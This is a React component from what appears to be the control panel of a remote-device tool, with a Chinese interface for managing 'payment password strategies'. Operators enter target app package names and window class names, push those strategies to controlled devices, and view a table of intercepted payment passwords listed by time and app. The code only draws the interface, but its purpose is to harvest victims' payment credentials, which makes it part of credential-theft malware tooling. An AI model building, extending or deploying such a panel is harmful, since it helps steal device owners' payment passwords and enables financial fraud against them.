/**
 * 支付密码Tab - 策略管理与截获记录
 * 从 ControlPage.jsx 提取 (lines 2687-2774)
 */
export default function PaymentTab({
  payStrategies,
  payNewPkg, setPayNewPkg,
  payNewName, setPayNewName,
  payNewWindows, setPayNewWindows,
  addPayStrategy,
  deletePayStrategy,
  loadPayStrategies,
  pushPayStrategies,
  payRecords,
  payRecordsTotal,
  payLoading,
  clearPayRecords,
  deletePayRecord,
  centerToast,
}) {
  return (
    <div className="ctrl-tab-content">
      <div className="ctrl-tab-panel">
        <div style={{ marginBottom: 20, padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 12, paddingBottom: 8, borderBottom: '1px solid rgba(255,255,255,.08)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <div style={{ width: 4, height: 18, background: '#fbbf24', borderRadius: 2 }} />
              <span style={{ fontSize: 15, fontWeight: 500, color: '#fff' }}>💰 支付密码策略</span>
            </div>
            <div style={{ display: 'flex', gap: 8 }}>
              <button onClick={() => { loadPayStrategies(); centerToast('已刷新') }} style={{ padding: '4px 12px', fontSize: 12, borderRadius: 6, border: '1px solid rgba(255,255,255,.1)', background: 'rgba(255,255,255,.05)', color: '#fff', cursor: 'pointer' }}>🔄 刷新</button>
              <button onClick={pushPayStrategies} style={{ padding: '4px 12px', fontSize: 12, borderRadius: 6, border: '1px solid rgba(24,144,255,.3)', background: 'rgba(24,144,255,.1)', color: '#38bdf8', cursor: 'pointer', fontWeight: 600 }}>📤 推送到设备</button>
            </div>
          </div>

          <div style={{ marginBottom: 12, padding: 12, background: 'rgba(255,255,255,.03)', borderRadius: 8, border: '1px solid rgba(255,255,255,.06)', display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center' }}>
            <input type="text" placeholder="包名 (com.xxx)" value={payNewPkg} onChange={e => setPayNewPkg(e.target.value)} style={{ flex: '1 1 180px', padding: '6px 10px', background: 'rgba(255,255,255,.05)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#fff', fontSize: 12 }} />
            <input type="text" placeholder="应用名(可选)" value={payNewName} onChange={e => setPayNewName(e.target.value)} style={{ flex: '0 1 120px', padding: '6px 10px', background: 'rgba(255,255,255,.05)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#fff', fontSize: 12 }} />
            <input type="text" placeholder="窗口类名(可选)" value={payNewWindows} onChange={e => setPayNewWindows(e.target.value)} style={{ flex: '1 1 160px', padding: '6px 10px', background: 'rgba(255,255,255,.05)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#fff', fontSize: 12 }} />
            <button onClick={addPayStrategy} style={{ padding: '6px 16px', background: 'linear-gradient(135deg, #22c55e, #16a34a)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>+ 添加</button>
          </div>

          {payStrategies.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '16px 0', color: '#94a3b8', fontSize: 13 }}>暂无策略，请添加</div>
          ) : (
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(260px, 1fr))', gap: 8 }}>
              {payStrategies.map(s => (
                <div key={s.id} style={{ padding: '10px 12px', background: 'rgba(255,255,255,.03)', borderRadius: 8, border: '1px solid rgba(255,255,255,.08)', display: 'flex', alignItems: 'center', gap: 8 }}>
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ fontSize: 12, color: '#fff', fontWeight: 600, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.appName || s.app_name || s.packageName || s.package_name || '--'}</div>
                    <div style={{ fontSize: 10, color: '#64748b', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.packageName || s.package_name || '--'}</div>
                  </div>
                  <button onClick={() => deletePayStrategy(s.id)} style={{ padding: '3px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(239,68,68,.3)', background: 'rgba(239,68,68,.1)', color: '#f87171', cursor: 'pointer' }}>删除</button>
                </div>
              ))}
            </div>
          )}
        </div>

        <div style={{ padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 12, paddingBottom: 8, borderBottom: '1px solid rgba(255,255,255,.08)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <div style={{ width: 4, height: 18, background: '#ef4444', borderRadius: 2 }} />
              <span style={{ fontSize: 15, fontWeight: 500, color: '#fff' }}>📋 截获记录</span>
              <span style={{ fontSize: 11, color: '#64748b' }}>(共 {payRecordsTotal} 条)</span>
            </div>
            <button onClick={clearPayRecords} style={{ padding: '4px 12px', fontSize: 12, borderRadius: 6, border: '1px solid rgba(239,68,68,.3)', background: 'rgba(239,68,68,.1)', color: '#f87171', cursor: 'pointer' }}>🗑 清空</button>
          </div>

          {payLoading ? (
            <div style={{ textAlign: 'center', padding: '24px 0', color: '#94a3b8' }}>加载中...</div>
          ) : payRecords.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '24px 0', color: '#94a3b8', fontSize: 13 }}>暂无支付密码记录</div>
          ) : (
            <div style={{ overflow: 'auto' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                <thead>
                  <tr style={{ background: 'rgba(255,255,255,.05)', borderBottom: '1px solid rgba(255,255,255,.08)' }}>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>时间</th>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>应用</th>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>密码</th>
                    <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>操作</th>
                  </tr>
                </thead>
                <tbody>
                  {payRecords.map((r, i) => (
                    <tr key={r.id || i} style={{ borderBottom: '1px solid rgba(255,255,255,.05)' }}>
                      <td style={{ padding: '8px 12px', color: '#94a3b8', fontSize: 11, whiteSpace: 'nowrap' }}>{r.createdAt ? new Date(r.createdAt).toLocaleString('zh-CN') : '--'}</td>
                      <td style={{ padding: '8px 12px', color: '#e2e8f0', fontSize: 11 }}>{r.appName || r.packageName || '--'}</td>
                      <td style={{ padding: '8px 12px', color: '#fbbf24', fontSize: 13, fontWeight: 700, fontFamily: 'monospace' }}>{r.cipher || r.password || '--'}</td>
                      <td style={{ padding: '8px 12px' }}><button onClick={() => deletePayRecord(r.id)} style={{ padding: '2px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(239,68,68,.3)', background: 'rgba(239,68,68,.08)', color: '#f87171', cursor: 'pointer' }}>删除</button></td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
